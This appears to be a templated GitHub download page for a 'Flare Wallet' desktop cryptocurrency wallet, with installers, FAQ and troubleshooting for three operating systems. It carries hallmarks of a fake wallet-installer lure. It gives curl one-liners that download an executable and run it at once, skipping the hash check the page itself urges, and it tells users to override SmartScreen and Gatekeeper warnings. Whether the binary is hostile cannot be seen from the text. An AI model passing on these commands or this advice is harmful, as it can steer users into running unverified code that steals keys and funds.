![Flare Wallet](assets/banner-article.png)

# Flare Wallet Download for Windows, macOS and Linux

Three installers, one release tag, and the exact filename each system needs.

## Downloads - v1.3.02

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`flare-wallet-desktop-windows-v1.3.02.exe`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`flare-wallet-desktop-macos-v1.3.02.dmg`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`flare-wallet-desktop-linux-v1.3.02.zip`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip) |

All three files are attached to the [current Flare Wallet release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02) under the tag `v1.3.02`, and that tag is the only one in the repository carrying a published release.

> Download only from this page or the release it links. A fourth file offered anywhere else is not part of this release.

Flare Wallet ships as three installers under one release tag: an `.exe` for Windows, a `.dmg` for macOS and a `.zip` for Linux. Download the file that matches your computer, check the name against the table above, and compare its SHA-256 with the published hash before you run it. There is no mobile app and no browser extension to install instead.

<!-- ARTICLE-BODY-BEGIN -->

## Which file does my computer need?

Windows takes the `.exe`, macOS takes the `.dmg`, and Linux takes the `.zip`. The filename encodes the platform and the version, so the file you have tells you both at a glance: `flare-wallet-desktop-windows-v1.3.02.exe` is the Windows build of `v1.3.02`, and the other two follow the same pattern.

Pick by the machine you will actually run the wallet on, not the one you happen to be reading this on. If you are downloading on a phone to move the file to a laptop later, you still need the laptop's build, because no phone build exists in this account. Still deciding whether you want it at all? Read <a href="https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-desktop-app.md">Flare Wallet desktop app</a> first; the download will still be here.

## What each of the three files is

The Windows file is a program you open to start setup. The macOS file is a disk image: open it, and you get a window with the application inside, which you drag to Applications before launching. Those two behave the way installers normally behave, and the operating system will raise its usual first-run prompt.

The Linux file is an archive, not a program. Extract it, then run the executable inside. Nothing in the release is an AppImage, so a command that downloads the zip and executes it directly cannot work, whatever a tutorial suggests.

## How to tell the real download from a lookalike

Three checks cover almost everything. First, the tag: real files live under `v1.3.02`, and the release page shows that tag in the URL. Second, the filename: the three names above are the complete list, so anything with a different name or a different version is not this release. Third, the hash: compare the SHA-256 of the file you downloaded against the published value character by character.

If a page offers you a wallet through an advertisement, a shortened link, a direct message or an emailed attachment, stop. The same applies to a "mirror" or a "faster download". These are the standard shapes of a fake installer, and the habit that defeats them is reading the tag and the filename before running anything. If you want the longer version of that reasoning, read <a href="https://github.com/flarewallet/flare-wallet-security/blob/HEAD/is-flare-wallet-safe.md">is Flare Wallet safe</a>.

## What you get after installing

A fresh install opens on Flare mainnet. Chain ID 14 and the public RPC are configured for you, so there is no network to add and no endpoint to type; the manual settings exist for putting Flare into other wallets. The wallet holds FLR, WFLR and FXRP, and signs staking and delegation transactions.

Your keys are encrypted on your own computer. There is no account to create and no server holding a copy, which means the recovery phrase you write down at setup is the only way back in. Write it before you fund anything, and test that it restores while the wallet is still empty.

## If the installer will not start

| Symptom | Cause | Fix |
| --- | --- | --- |
| Windows shows a blue "Windows protected your PC" panel | SmartScreen has not seen this publisher before | Choose More info, then Run anyway, after confirming the filename and hash |
| macOS says the app cannot be opened because the developer cannot be verified | Gatekeeper blocks apps distributed outside the App Store | Right-click the app, choose Open, then confirm |
| The Linux build will not launch after extraction | The archive was run directly, or the file lost its execute permission | Extract instead of running the archive, then mark the executable as runnable |
| The download stops part way, or the file will not open | An interrupted transfer, not a broken release | Delete it and download again from the release page |

Downloading and running the <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02">current Flare Wallet release</a> is the first step in every one of these cases, because a partial or renamed file is the usual cause. It does not guarantee a fix for a machine-level problem such as a missing system library, and if the install keeps failing, <a href="https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-update.md">keep Flare Wallet updated</a> explains how to replace a build cleanly.

## FAQ

### Where do I download Flare Wallet Desktop?

From the release page linked at the top of this article, under the tag `v1.3.02`. There are three files, one per platform, and no other download source is published by this project.

### Is there an official Flare Wallet release page?

Yes. The releases area of the `flare-desktop-wallet` repository is the only place installers are attached, and `v1.3.02` is the tag to use. Older tags exist in the repository, but only this one carries a published release.

### How do I verify the Flare Wallet installer checksum?

Run `certutil -hashfile <file> SHA256` on Windows, `shasum -a 256 <file>` on macOS or `sha256sum <file>` on Linux, then compare all 64 characters with the published value. If any character differs, delete the file and download again.

### Can I install it on my phone instead?

No. This account publishes desktop installers only: there is no mobile application and no browser extension. A phone-sized "Flare Wallet" offered by a store listing or a link is not this product.

### How do I find the wallet app after installing it?

Look under Flare Wallet in the Windows Start menu, in Applications on macOS, and in the folder where you extracted the archive on Linux.

### Why can I not send FLR from Flare Wallet Desktop?

Usually because the balance is on a different network, the amount is below the fee, or the transaction is still pending. Check the address on the Flare explorer first: if the explorer shows the same balance, the wallet is reading the chain correctly and the problem is in the transaction rather than the download.

### Should I back up before I start using it?

Yes. Write the recovery phrase down before you fund the wallet, and read <a href="https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-backup.md">Flare Wallet backup and restore</a> before you move anything of value. A backup you have not tested is a guess.

<!-- ARTICLE-BODY-END -->

## How to install Flare Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->

### Windows

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe">flare-wallet-desktop-windows-v1.3.02.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg">flare-wallet-desktop-macos-v1.3.02.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux build is an archive, so there is no verified download-and-run one-liner for it: the executable inside is not named anywhere this project can check in advance. Download it, verify the hash, extract, then launch what is inside.

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip">flare-wallet-desktop-linux-v1.3.02.zip</a>.
2. Verify it before extracting: `sha256sum flare-wallet-desktop-linux-v1.3.02.zip`.
3. Extract the archive with your file manager or `unzip flare-wallet-desktop-linux-v1.3.02.zip`.
4. Make the extracted executable runnable if it is not already, then launch it.
<!-- INSTALL-END -->

## Related guides

[Flare Wallet desktop app](https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-desktop-app.md) | [is Flare Wallet safe](https://github.com/flarewallet/flare-wallet-security/blob/HEAD/is-flare-wallet-safe.md) | [keep Flare Wallet updated](https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-update.md) | [Flare Wallet backup and restore](https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-backup.md) | [current release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02)
